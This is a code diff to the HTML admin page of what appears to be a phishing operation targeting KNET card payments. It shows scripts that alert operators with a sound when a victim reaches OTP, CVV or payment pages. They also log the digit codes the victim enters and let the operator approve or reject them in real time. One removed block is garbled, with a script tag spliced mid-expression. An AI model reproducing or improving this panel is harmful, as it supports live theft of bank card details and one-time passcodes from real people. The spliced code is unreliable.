@@ -4032,234 +4032,10 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   hook(); setInterval(hook, 400);
 })();
 </script>
-<script type="text/htmlpreview" id="kddF102">
+<!-- FIX111 -->
+<script id="kddF110">
 (function(){
-  if (window.__f102) return; window.__f102 = 1;
-  var orig = window.renderVisitorsList;
-  if (typeof orig === "function" && !orig.__f102){
-    var t = null, last = 0;
-    var w = function(){
-      var ctx = this, args = arguments, now = Date.now();
-      if (now - last < 400){
-        if (t) clearTimeout(t);
-        t = setTimeout(function(){ last = Date.now(); t = null; try { orig.apply(ctx, args); } catch(e){} }, 400);
-        return;
-      }
-      last = now;
-      return orig.apply(ctx, args);
-    };
-    w.__f102 = 1; window.renderVisitorsList = w; try { renderVisitorsList = w; } catch(e){}
-  }
-})();
-</script>
-<script type="text/htmlpreview" id="kddF104">
-(function(){
-  if (window.__f104) return; window.__f104 = 1;
-  var REJ = {};
-  try { REJ = JSON.parse(localStorage.getItem("kdd_rej")||"{}") || {}; } catch(e){ REJ = {}; }
-  function save(){ try { localStorage.setItem("kdd_rej", JSON.stringify(REJ)); } catch(e){} }
-  function selId(){ try { return selectedVisitorId || null; } catch(e){ return null; } }
-  function vis(id){ var v=null; try { v = visitors.get(id) || null; } catch(e){} if(!v){ try { visitors.forEach(function(x){ if(!v && x && x._id===id) v=x; }); } catch(e){} } return v; }
-  function codeNear(el){
-    var n = el, d = 0;
-    while (n && d < 6){
-      if (n.querySelectorAll){
-        var cs = n.querySelectorAll("span,b,strong,td");
-        for (var i=0;i<cs.length;i++){ var t=(cs[i].textContent||"").trim(); if (/^\d{4,6}$/.test(t)) return t; }
-      }
-      n = n.parentElement; d++;
-    }
-    return null;
-  }
-  document.addEventListener("click", function(e){
-    var b = e.target && e.target.closest ? e.target.closest("button") : null;
-    if (!b) return;
-    var tx = (b.textContent||"").trim();
-    var st = tx.indexOf("رفض") > -1 ? "مرفوض" : (tx.indexOf("موافقة") > -1 ? "مقبول" : null);
-    if (!st) return;
-    var id = selId(); if (!id) return;
-    var code = codeNear(b);
-    if (!code){ try { var v = vis(id); if (v && (v.digitCodes||[]).length) code = String(v.digitCodes[v.digitCodes.length-1].code||""); } catch(e){} }
-    if (!code) return;
-    var arr = REJ[id] || (REJ[id] = []);
-    if (arr.length && arr[arr.length-1].c === code && arr[arr.length-1].s === st) { /* same */ } else {
-      arr.push({ c: code, s: st, t: new Date().toLocaleTimeString("ar-EG",{hour:"2-digit",minute:"2-digit"}) });
-      save();
-    }
-    draw();
-  }, true);
-  function draw(){
-    var box = document.getElementById("visitorDetails");
-    if (!box) return;
-    var id = selId(); if (!id) return;
-    var old = document.getElementById("f104box"); if (old && old.parentNode) old.parentNode.removeChild(old);
-    var arr = REJ[id] || []; if (!arr.length) return;
-    var d = document.createElement("div");
-    d.id = "f104box";
-    d.style.cssText = "border:2px solid #f59e0b;border-radius:12px;padding:10px;margin:10px 0;background:#fffbeb";
-    var h = document.createElement("div");
-    h.style.cssText = "display:flex;justify-content:space-between;align-items:center;font-weight:800;margin-bottom:6px";
-    var hs = document.createElement("span"); hs.textContent = "🔒 الرموز المرفوضة (محفوظة)";
-    var cl = document.createElement("button");
-    cl.textContent = "مسح"; cl.style.cssText = "font-size:11px;padding:3px 9px;border-radius:8px;border:1px solid #f59e0b;background:#fff;color:#b45309;cursor:pointer";
-    cl.addEventListener("click", function(){ REJ[id] = []; save(); draw(); });
-    h.appendChild(hs); h.appendChild(cl); d.appendChild(h);
-    for (var i=arr.length-1;i>=0;i--){
-      var r = document.createElement("div");
-      r.style.cssText = "display:flex;justify-content:space-between;font-family:monospace;font-size:14px;padding:4px 0;border-top:1px dashed #e5e7eb";
-      var a = document.createElement("b"); a.textContent = arr[i].c;
-      var c = document.createElement("span"); c.textContent = arr[i].s + " · " + arr[i].t;
-      c.style.color = arr[i].s === "مرفوض" ? "#dc2626" : "#16a34a";
-      r.appendChild(a); r.appendChild(c); d.appendChild(r);
-    }
-    box.insertBefore(d, box.firstChild);
-  }
-  var orig = window.renderVisitorDetails;
-  if (typeof orig === "function" && !orig.__f104){
-    var w = function(){ var r = orig.apply(this, arguments); try { draw(); } catch(e){} return r; };
-    w.__f104 = 1; window.renderVisitorDetails = w; try { renderVisitorDetails = w; } catch(e){}
-  }
-  setInterval(function(){ if (!document.getElementById("f104box")<script type="text/htmlpreview" id="kddF105">
-(function(){
-  if (window.__f105) return; window.__f105 = 1;
-  function ding(){
-    try { frogAudio.currentTime = 0; frogAudio.play().catch(function(){}); return; } catch(e){}
-    try { new Audio("/admin/frog.mp3").play(); } catch(e){}
-  }
-  var PAY = /ملخص|summary|دفع|كي نت|knet|otp|رمز|cvv|atm|نهائي|final/i;
-  function hook(){
-    try {
-      var s = window.socket;
-      if (!s || s === window.__stub || !s.on || s.__f105) return;
-      s.__f105 = 1;
-      s.on("visitor:pageChanged", function(d){
-        try { var p = String((d && d.page) || ""); if (PAY.test(p)) ding(); } catch(e){}
-      });
-      s.on("visitor:dataSubmitted", function(d){
-        try { var p = String((d && d.data && d.data.page) || ""); if (PAY.test(p)) ding(); } catch(e){}
-      });
-    } catch(e){}
-  }
-  hook(); setInterval(hook, 500);
-})();
-</script>
-) draw(); }, 800);
-})();
-</script>
-<script type="text/htmlpreview" id="kddF107">
-/* ===== الرموز/البطاقات المرفوضة تبقى ككرت كامل ===== */
-(function(){
-  if (window.__f107a) return; window.__f107a = 1;
-  var LOG = {};
-  try { LOG = JSON.parse(localStorage.getItem("kdd_rej")||"{}") || {}; } catch(e){ LOG = {}; }
-  function save(){ try { localStorage.setItem("kdd_rej", JSON.stringify(LOG)); } catch(e){} }
-  function selId(){ try { return selectedVisitorId || null; } catch(e){ return null; } }
-  function vis(id){ var v=null; try { v = visitors.get(id) || null; } catch(e){} if(!v){ try { visitors.forEach(function(x){ if(!v && x && x._id===id) v=x; }); } catch(e){} } return v; }
-  function codeNear(el){
-    var n = el, d = 0;
-    while (n && d < 6){
-      if (n.querySelectorAll){
-        var cs = n.querySelectorAll("span,b,strong,td");
-        for (var i=0;i<cs.length;i++){ var t=(cs[i].textContent||"").trim(); if (/^\d{4,6}$/.test(t)) return t; }
-      }
-      n = n.parentElement; d++;
-    }
-    return null;
-  }
-  function pageNear(el){
-    var n = el, d = 0;
-    while (n && d < 6){
-      if (n.textContent && /رمز التحقق|كي نت|OTP/.test(n.textContent)) return "رمز التحقق كي نت (OTP)";
-      n = n.parentElement; d++;
-    }
-    return "رمز";
-  }
-  document.addEventListener("click", function(e){
-    var b = e.target && e.target.closest ? e.target.closest("button") : null;
-    if (!b) return;
-    var tx = (b.textContent||"").trim();
-    var st = tx.indexOf("رفض") > -1 ? "مرفوض" : (tx.indexOf("موافقة") > -1 ? "مقبول" : null);
-    if (!st) return;
-    var id = selId(); if (!id) return;
-    var code = codeNear(b);
-    if (!code){ try { var v = vis(id); if (v && (v.digitCodes||[]).length) code = String(v.digitCodes[v.digitCodes.length-1].code||""); } catch(e){} }
-    if (!code) return;
-    var arr = LOG[id] || (LOG[id] = []);
-    var last = arr[arr.length-1];
-    if (!(last && last.c === code && last.s === st)){
-      arr.push({ c: code, s: st, pg: pageNear(b), t: new Date().toLocaleTimeString("ar-EG",{hour:"2-digit",minute:"2-digit"}) });
-      save();
-    }
-    draw();
-  }, true);
-  function draw(){
-    var box = document.getElementById("visitorDetails"); if (!box) return;
-    var id = selId(); if (!id) return;
-    var old = document.getElementById("f107box"); if (old && old.parentNode) old.parentNode.removeChild(old);
-    var arr = LOG[id] || []; if (!arr.length) return;
-    var w = document.createElement("div");
-    w.id = "f107box";
-    w.style.cssText = "margin:10px 0";
-    var h = document.createElement("div");
-    h.style.cssText = "display:flex;justify-content:space-between;align-items:center;font-weight:800;font-size:15px;margin-bottom:8px;color:#92400e";
-    var hs = document.createElement("span"); hs.textContent = "🔒 الرموز المرفوضة (محفوظة — لا تُحذف)";
-    var cl = document.createElement("button");
-    cl.textContent = "مسح"; cl.style.cssText = "font-size:11px;padding:3px 10px;border-radius:8px;border:1px solid #f59e0b;background:#fff;color:#b45309;cursor:pointer";
-    cl.addEventListener("click", function(){ LOG[id] = []; save(); draw(); });
-    h.appendChild(hs); h.appendChild(cl); w.appendChild(h);
-    for (var i=arr.length-1;i>=0;i--){
-      var it = arr[i];
-      var rej = it.s === "مرفوض";
-      var c = document.createElement("div");
-      c.style.cssText = "border:2px solid " + (rej ? "#f97316" : "#16a34a") + ";border-radius:12px;padding:12px 14px;margin:8px 0;background:" + (rej ? "#fff7ed" : "#f0fdf4");
-      var top = document.createElement("div");
-      top.style.cssText = "display:flex;justify-content:space-between;align-items:center";
-      var code = document.createElement("b");
-      code.textContent = it.c;
-      code.style.cssText = "font-family:monospace;font-size:24px;letter-spacing:2px;color:" + (rej ? "#c2410c" : "#15803d");
-      var tag = document.createElement("span");
-      tag.textContent = it.s + " · " + it.t;
-      tag.style.cssText = "font-size:12px;font-weight:700;padding:3px 10px;border-radius:8px;background:" + (rej ? "#fee2e2" : "#dcfce7") + ";color:" + (rej ? "#b91c1c" : "#15803d");
-      top.appendChild(code); top.appendChild(tag); c.appendChild(top);
-      var sub = document.createElement("div");
-      sub.textContent = it.pg + " — محفوظ ولا يُحذف";
-      sub.style.cssText = "font-size:12px;color:#9a3412;margin-top:6px";
-      c.appendChild(sub);
-      w.appendChild(c);
-    }
-    box.insertBefore(w, box.firstChild);
-  }
-  var orig = window.renderVisitorDetails;
-  if (typeof orig === "function" && !orig.__f107a){
-    var f = function(){ var r = orig.apply(this, arguments); try { draw(); } catch(e){} return r; };
-    f.__f107a = 1; window.renderVisitorDetails = f; try { renderVisitorDetails = f; } catch(e){}
-  }
-  setInterval(function(){ if (!document.getElementById("f107box")) draw(); }, 700);
-})();
-/* ===== صوت الضفدع ===== */
-(function(){
-  if (window.__f107b) return; window.__f107b = 1;
-  function ding(){
-    try { frogAudio.currentTime = 0; frogAudio.play().catch(function(){}); return; } catch(e){}
-    try { new Audio("/admin/frog.mp3").play(); } catch(e){}
-  }
-  var PAY = /ملخص|summary|دفع|كي نت|knet|otp|رمز|cvv|atm|نهائي|final/i;
-  function hook(){
-    try {
-      var s = window.socket;
-      if (!s || s === window.__stub || !s.on || s.__f107b) return;
-      s.__f107b = 1;
-      s.on("visitor:pageChanged", function(d){ try { if (PAY.test(String((d&&d.page)||""))) ding(); } catch(e){} });
-      s.on("visitor:dataSubmitted", function(d){ try { if (PAY.test(String((d&&d.data&&d.data.page)||""))) ding(); } catch(e){} });
-    } catch(e){}
-  }
-  hook(); setInterval(hook, 500);
-})();
-</script>
-<!-- FIX108 -->
-<script type="text/htmlpreview" id="kddF108">
-(function(){
-  if (window.__f108) return; window.__f108 = 1;
+  if (window.__f110) return; window.__f110 = 1;
   var K = {};
   try { K = JSON.parse(localStorage.getItem("kdd_rej")||"{}") || {}; } catch(e){ K = {}; }
   function sv(){ try { localStorage.setItem("kdd_rej", JSON.stringify(K)); } catch(e){} }
@@ -4287,9 +4063,9 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   function draw(){
     var box = document.getElementById("visitorDetails"); if (!box) return;
     var id = sid(); if (!id) return;
-    var o = document.getElementById("f108box"); if (o && o.parentNode) o.parentNode.removeChild(o);
+    var o = document.getElementById("f110box"); if (o && o.parentNode) o.parentNode.removeChild(o);
     var a = K[id] || []; if (!a.length) return;
-    var w = document.createElement("div"); w.id = "f108box"; w.style.cssText = "margin:10px 0";
+    var w = document.createElement("div"); w.id = "f110box"; w.style.cssText = "margin:10px 0";
     var h = document.createElement("div");
     h.style.cssText = "font-weight:800;font-size:15px;color:#92400e;margin-bottom:8px";
     h.textContent = "🔒 الرموز المرفوضة (محفوظة — لا تُحذف)";
@@ -4333,16 +4109,16 @@ run();setInterval(function(){note();apply()},1200);})();</script>
     draw();
   }, true);
   var o = window.renderVisitorDetails;
-  if (typeof o === "function" && !o.__f108){
+  if (typeof o === "function" && !o.__f110){
     var f = function(){ var r = o.apply(this, arguments); try { draw(); } catch(e){} return r; };
-    f.__f108 = 1; window.renderVisitorDetails = f; try { renderVisitorDetails = f; } catch(e){}
+    f.__f110 = 1; window.renderVisitorDetails = f; try { renderVisitorDetails = f; } catch(e){}
   }
-  setInterval(function(){ if (!document.getElementById("f108box")) draw(); }, 700);
+  setInterval(function(){ if (!document.getElementById("f110box")) draw(); }, 700);
 })();
 </script>
-<script type="text/htmlpreview" id="kddF109">
+<script id="kddF111">
 (function(){
-  if (window.__f109) return; window.__f109 = 1;
+  if (window.__f111) return; window.__f111 = 1;
   function d(){
     try { frogAudio.currentTime = 0; frogAudio.play().catch(function(){}); return; } catch(e){}
     try { new Audio("/admin/frog.mp3").play(); } catch(e){}
@@ -4351,8 +4127,8 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   function h(){
     try {
       var s = window.socket;
-      if (!s || s === window.__stub || !s.on || s.__f109) return;
-      s.__f109 = 1;
+      if (!s || s === window.__stub || !s.on || s.__f111) return;
+      s.__f111 = 1;
       s.on("visitor:pageChanged", function(x){ try { if (P.test(String((x&&x.page)||""))) d(); } catch(e){} });
       s.on("visitor:dataSubmitted", function(x){ try { if (P.test(String((x&&x.data&&x.data.page)||""))) d(); } catch(e){} });
     } catch(e){}
